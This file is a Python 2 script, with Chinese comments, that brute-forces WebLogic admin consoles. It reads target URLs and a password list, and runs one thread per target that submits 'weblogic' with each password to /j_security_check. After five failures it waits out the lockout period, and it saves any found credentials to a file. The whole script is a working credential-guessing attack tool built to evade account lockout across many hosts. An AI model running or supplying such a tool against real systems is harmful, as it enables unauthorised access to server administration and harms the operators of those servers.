#coding=utf-8
import requests
import threading
import time
def post(i):
	global xtime
	try:
		z=0
		co=1
		count=len(open('pwd.txt','rU').readlines())
		for pwd in open("pwd.txt").readlines():
			pwd=pwd.strip('\n')
			#print 'weblogic'+'/'+pwd
			z=z+1
			co=co+1
			if z == 6:	#账户错误达到5次，此账户锁定30分钟，等待重试
				print i+' Waiting......'
				ct=0
				b=31
				while (ct<b):
                                        ncount=b-ct
                                        ncount='%d' %ncount
                                        print i+'\n'+ncount+'min left'
                                        time.sleep(60)
                                        ct+=1
				z=1 #重置计数
			data = {'j_username':'weblogic','j_password':pwd}
			s = requests.post(i+'/j_security_check',data =data,timeout=5)
			if s.content.count('Home Page') !=0 or s.content.count('WebLogic Server Console') !=0 or s.content.count('console.portal') !=0:
				print i,'Success!!!!!' 
				print 'weblogic'+'/'+pwd
				f = open(xtime+'.txt', 'a')
				f.write(i+' ')
				f.write('weblogic'+'/')
				f.write(pwd+'\n')
				f.close()
				s=0
				break #成功，停止循环
			else:
				if co == count: #如果已尝试密码数等于字典行数，则输出失败
					print i,'Failed!'
					f = open("bad.txt", 'a')
					f.write(i+'\n')
					f.close()
					s = 0
	except:
		s=0

def main():
	global xtime
	xtime=time.strftime("%Y-%m-%d[%H.%M]")
	tsk=[]
	for i in open("u.txt").readlines():
		i=i.strip('\n')
		t = threading.Thread(target = post,args=(i,))
		tsk.append(t)
	for t in tsk:
		t.start()
		t.join(1) #1秒钟加入一个线程,即使前面的处于等待状态也不影响后面的猜解

if __name__ == '__main__':
	main()
